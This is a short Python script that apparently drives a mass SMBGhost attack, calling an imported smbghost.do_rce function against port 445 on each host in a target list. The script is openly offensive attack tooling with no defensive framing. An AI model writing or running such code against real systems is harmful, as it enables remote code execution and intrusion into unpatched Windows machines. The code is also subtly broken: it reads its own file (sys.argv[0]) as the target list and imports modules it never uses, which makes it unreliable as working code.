import sys, os, threading, socket
import smbghost
import smb_win
# import libraries
threads = []
file = sys.argv[0]

target_list = open(file, "r").readlines()

def exploit(target):
    try:
        smbghost.do_rce(target, 445)
    except socket.error as e:
        print ("Error creating socket: %s" % e)
for target in target_list:
    target = target.strip()
    exploit(target)
